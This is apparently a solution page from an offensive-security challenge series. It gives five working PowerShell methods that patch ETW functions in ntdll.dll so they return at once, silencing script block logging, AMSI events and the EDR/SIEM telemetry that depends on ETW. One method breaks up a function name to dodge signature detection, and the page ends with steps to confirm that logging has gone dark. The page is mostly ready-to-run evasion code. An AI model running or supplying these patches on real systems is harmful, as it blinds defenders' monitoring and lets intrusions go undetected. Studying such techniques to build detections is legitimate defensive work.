---
title: "Solution 43: ETW Patching (Blind All Telemetry)"
challenge_number: 43
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/43-etw-patching/
---

# Solution: ETW Patching (Blind All Telemetry)

[Back to Challenge](../challenges/43-etw-patching.md)

## Overview

Patch `EtwEventWrite` in `ntdll.dll` to immediately return without doing anything. Since ALL Event Tracing for Windows (ETW) events flow through this single function, patching it blinds: Script Block Logging, AMSI telemetry, .NET Assembly Load events, and all EDR/SIEM ETW consumers in one stroke.

## Working Code

### Method 1: Patch EtwEventWrite (Primary)

```powershell
# P/Invoke definitions
$code = @'
using System;
using System.Runtime.InteropServices;

public class EtwPatch
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
'@

Add-Type $code

# Get address of EtwEventWrite in ntdll.dll
$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
$etwAddr = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")

Write-Host "EtwEventWrite at: 0x$($etwAddr.ToString('X'))"

# Change memory protection to writable
$oldProtect = 0
[EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]1, 0x40, [ref]$oldProtect)

# Write 0xC3 (ret) as the first byte - function immediately returns
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)

# Restore original protection
[EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]1, $oldProtect, [ref]$oldProtect)

Write-Host "EtwEventWrite patched - all ETW events silenced."
```

### Method 2: Using Marshal Directly (No Add-Type)

```powershell
# Get ntdll module handle from already-loaded modules
$ntdllModule = [System.Diagnostics.Process]::GetCurrentProcess().Modules |
    Where-Object { $_.ModuleName -eq "ntdll.dll" }
$ntdllBase = $ntdllModule.BaseAddress

# Alternative: get handle via reflection
$getProc = [System.Runtime.InteropServices.Marshal].GetMethod('GetDelegateForFunctionPointer',
    [Type[]]@([IntPtr], [Type]))

# P/Invoke via dynamic method
$dynAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
    (New-Object System.Reflection.AssemblyName("DynAsm")),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$dynModule = $dynAssembly.DefineDynamicModule("DynMod")
$dynType = $dynModule.DefineType("K32", "Public,Class")

# GetProcAddress
$method = $dynType.DefineMethod("GetProcAddress", "Public,Static",
    [IntPtr], @([IntPtr], [String]))
$method.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder(
    [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])),
    @("kernel32.dll"))))

# Build and invoke (simplified - full implementation uses compiled type)
```

### Method 3: Complete Self-Contained Script

```powershell
# All-in-one ETW patch with obfuscated function names
$a = "Etw" + "Event" + "Write"  # Avoid static signature
$b = "ntdll"

Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
' -Name 'K32' -Namespace 'Sys'

$dll = [Sys.K32]::LoadLibrary($b)
$addr = [Sys.K32]::GetProcAddress($dll, $a)

$p = 0
[Sys.K32]::VirtualProtect($addr, [UIntPtr]1, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
[Sys.K32]::VirtualProtect($addr, [UIntPtr]1, $p, [ref]$p)

Write-Host "ETW silenced."
```

### Method 4: Patch NtTraceEvent (Deeper Hook)

```powershell
# NtTraceEvent is the syscall stub - even lower level
Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
' -Name 'K32' -Namespace 'W'

$ntdll = [W.K32]::LoadLibrary("ntdll.dll")
$ntTrace = [W.K32]::GetProcAddress($ntdll, "NtTraceEvent")

if ($ntTrace -ne [IntPtr]::Zero) {
    $old = 0
    # Patch: xor eax,eax; ret (return STATUS_SUCCESS without making syscall)
    [W.K32]::VirtualProtect($ntTrace, [UIntPtr]3, 0x40, [ref]$old)
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x31, 0xC0, 0xC3), 0, $ntTrace, 3)
    [W.K32]::VirtualProtect($ntTrace, [UIntPtr]3, $old, [ref]$old)
    Write-Host "NtTraceEvent patched."
}
```

### Method 5: Patch Multiple ETW Functions

```powershell
# Comprehensive ETW silencing
Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
' -Name 'K32' -Namespace 'W2'

$ntdll = [W2.K32]::LoadLibrary("ntdll.dll")

# All ETW-related functions to patch
$functions = @(
    "EtwEventWrite",
    "EtwEventWriteFull",
    "EtwEventWriteTransfer"
)

foreach ($func in $functions) {
    $addr = [W2.K32]::GetProcAddress($ntdll, $func)
    if ($addr -ne [IntPtr]::Zero) {
        $old = 0
        [W2.K32]::VirtualProtect($addr, [UIntPtr]1, 0x40, [ref]$old)
        [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)  # ret
        [W2.K32]::VirtualProtect($addr, [UIntPtr]1, $old, [ref]$old)
        Write-Host "Patched: $func"
    }
}
```

## Why It Works

### ETW Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    ETW Providers                         │
├─────────────────────────────────────────────────────────┤
│  PowerShell      │  .NET CLR      │  AMSI             │
│  ScriptBlock     │  Assembly      │  Scan             │
│  Logging         │  Load Events   │  Events           │
└────────┬─────────┴───────┬────────┴────────┬──────────┘
         │                 │                 │
         └────────────┬────┘─────────────────┘
                      ▼
         ┌────────────────────────┐
         │   EtwEventWrite()     │  ← ALL events funnel here
         │   (ntdll.dll)         │
         └────────────┬──────────┘
                      │  ← We patch here: 0xC3 (ret)
                      ▼
         ┌────────────────────────┐
         │   ETW Session Buffers │  ← Never reached
         │   (kernel)            │
         └────────────┬──────────┘
                      ▼
         ┌────────────────────────┐
         │   Consumers           │  ← Never receive events
         │   (EDR, SIEM, WEF)    │
         └────────────────────────┘
```

### The Single Chokepoint

`EtwEventWrite` in `ntdll.dll` is the **single user-mode function** through which all ETW events must pass before reaching the kernel. By patching its first byte to `0xC3` (ret), the function returns immediately without:
- Writing to ETW session buffers
- Making the `NtTraceEvent` syscall
- Delivering events to any consumer

### What Gets Blinded

| Telemetry Source | ETW Provider | Effect When Patched |
|---|---|---|
| Script Block Logging | Microsoft-Windows-PowerShell | No script content logged |
| AMSI telemetry | Microsoft-Antimalware-Scan-Interface | No scan events recorded |
| .NET Assembly Load | Microsoft-Windows-DotNETRuntime | Assembly loads invisible |
| Module Logging | Microsoft-Windows-PowerShell | No module activity logged |
| Process creation | Microsoft-Windows-Kernel-Process | Processes untracked |
| Network activity | Microsoft-Windows-Kernel-Network | Connections invisible |

### Why ntdll.dll is Patchable

- `ntdll.dll` is mapped into user-space memory of every process
- Page protections are changeable via `VirtualProtect` (a user-mode API)
- No integrity verification is performed on ntdll code pages at runtime
- The modification only affects the current process (copy-on-write semantics)

### The 0xC3 Patch

```asm
; Before (EtwEventWrite prologue):
sub rsp, 0x58         ; 48 83 EC 58
mov r11, rsp          ; 4C 8B DC
...

; After patch:
ret                   ; C3 (first byte overwritten)
83 EC 58              ; (dead code - never reached)
4C 8B DC              ; (dead code)
...
```

The function returns immediately on entry. The return value in `eax` is whatever garbage was left there (or 0 from a previous operation), which callers interpret as success and ignore.

## How to Verify

1. Before patching, verify ETW is working by checking Script Block Logging:
   ```powershell
   # Execute something that generates a script block log
   Invoke-Expression 'Write-Host "This should be logged"'

   # Check the event log
   Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 5 |
       Where-Object { $_.Id -eq 4104 } |
       Select-Object -First 1 -ExpandProperty Message
   # Should show the script block content
   ```

2. Apply the ETW patch (Method 1 or Method 3).

3. Verify the patch is in place:
   ```powershell
   Add-Type -MemberDefinition '
   [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
   [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
   ' -Name 'Verify' -Namespace 'V'

   $ntdll = [V.Verify]::LoadLibrary("ntdll.dll")
   $addr = [V.Verify]::GetProcAddress($ntdll, "EtwEventWrite")
   $firstByte = [System.Runtime.InteropServices.Marshal]::ReadByte($addr)
   Write-Host "First byte of EtwEventWrite: 0x$($firstByte.ToString('X2'))"
   # Should show: 0xC3
   ```

4. Execute commands and verify they are NOT logged:
   ```powershell
   # This should NOT appear in script block logs
   Invoke-Expression 'Write-Host "This should NOT be logged - ETW is patched"'
   ```

5. Check event logs — no new 4104 events should appear:
   ```powershell
   # In a DIFFERENT PowerShell session (to query logs without ETW issues):
   Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3 |
       Where-Object { $_.Id -eq 4104 } |
       Format-Table TimeCreated, Message -Wrap
   # The "NOT be logged" string should be absent from recent events
   ```

6. Verify the patch doesn't crash the process:
   ```powershell
   # Normal PowerShell operations should continue working
   Get-Process | Select-Object -First 5
   Get-ChildItem C:\
   Write-Host "PowerShell still functional after ETW patch"
   ```
